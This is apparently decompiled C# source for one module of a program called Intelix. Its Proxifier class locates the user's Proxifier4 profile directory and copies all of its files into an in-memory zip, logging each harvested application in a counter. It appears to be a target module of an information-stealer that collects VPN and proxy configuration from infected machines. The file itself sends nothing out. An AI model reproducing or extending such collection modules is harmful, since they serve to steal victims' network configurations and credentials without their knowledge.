using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000012 RID: 18
	public class Proxifier : ITarget
	{
		// Token: 0x06000037 RID: 55 RVA: 0x00003200 File Offset: 0x00001400
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Proxifier4", "Profiles");
			bool flag = Directory.Exists(text);
			if (flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Proxifier";
				zip.AddDirectoryFiles(text, "Proxifier", true);
				counterApplications.Files.Add(text + " => Proxifier");
				counterApplications.Files.Add("Proxifier\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
